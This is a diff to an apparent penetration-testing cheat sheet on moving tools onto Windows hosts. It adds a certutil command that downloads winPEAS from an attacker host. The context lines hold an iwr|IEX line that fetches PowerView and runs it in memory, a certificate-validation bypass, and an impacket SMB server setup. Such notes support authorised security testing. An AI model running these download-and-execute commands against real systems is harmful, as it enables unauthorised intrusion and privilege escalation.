@@ -20,6 +20,8 @@
 				- `iwr https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
 			- Certificate isn't trusted
 				- Use this command before the download command. `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
+	- ##### Certutil
+		- `certutil -urlcache -f http://<ip>:8000/winPEASx86.exe winPEASx86.exe`
 	- ##### SMB
 		- Create an `SMB` server on our device with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) and then use `copy, move` or PowerShell `Copy-Item`.
 			- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` on the attack device.
